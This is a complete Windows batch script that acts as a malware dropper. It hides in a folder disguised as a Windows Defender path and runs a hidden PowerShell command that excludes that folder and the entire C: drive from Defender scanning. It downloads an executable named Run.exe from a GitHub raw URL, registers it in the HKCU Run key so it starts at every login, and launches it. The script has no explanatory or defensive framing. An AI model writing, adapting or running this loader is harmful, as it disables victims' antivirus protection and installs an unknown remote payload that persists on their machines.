@echo off
setlocal

set "folder=%APPDATA%\LocalLow\Windows Defender\Windows\Folder Windows\Fuck You"
if not exist "%folder%" (
    mkdir "%folder%"
)
PowerShell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%folder%', 'C:\'"

set "file_url=https://github.com/khoa1234567/AI/raw/main/Run.exe"
set "file_path=%folder%\Run.exe"
if not exist "%file_path%" (
    powershell -command "(New-Object System.Net.WebClient).DownloadFile('%file_url%', '%file_path%')"
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyApp" /t REG_SZ /d "\"%file_path%\"" /f
if exist "%file_path%" (
    start "" "%file_path%"
)

endlocal
